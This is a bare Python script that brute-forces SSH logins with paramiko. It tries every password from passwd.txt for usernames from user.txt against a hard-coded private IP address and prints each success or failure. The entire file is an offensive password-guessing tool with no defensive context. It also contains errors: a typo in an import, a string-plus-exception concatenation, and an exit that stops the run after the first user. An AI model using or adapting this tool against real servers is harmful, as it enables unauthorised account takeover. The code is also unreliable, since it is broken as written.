import paramiko
import sysn


global user
global passwd

user   = []
passwd = []

def open_File():
        
        try:
                with open('user.txt','r') as u:
                        for i in u.readlines():
                                i = i.strip()
                                user.append(i)
                with open('passwd.txt','r') as p:
                        for i in p.readlines():
                                i = i.strip()
                                passwd.append(i)
        except Exception as e:
                print ("[-] " + e)

def pojie(uu,ssh):
        
        url = "192.168.43.91"
        
        for pp in passwd:
                try:
                        ssh.connect(url,username=uu,password=pp)
                        if len(pp) % 12:
                                pp = pp + ((12-len(pp)) * '-')
                        print ('\033[7;1;1m[*] {}:{}------ Success!!! >>>> {} \033[0m'.format(uu,pp,url))
                        break
                except:
                        if len(pp) % 12:
                                pp = pp + ((12-len(pp)) * '-')                        
                        print ("[-] {}:{}------ Falead!!!  >>>> {}".format(uu,pp,url))
                
        sys.exit()
        
        return



def main():
        ssh = paramiko.SSHClient()
        
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy)
        
        open_File()
        
        for uu in user:
                pojie(uu,ssh)
        
main()






                

                          
                        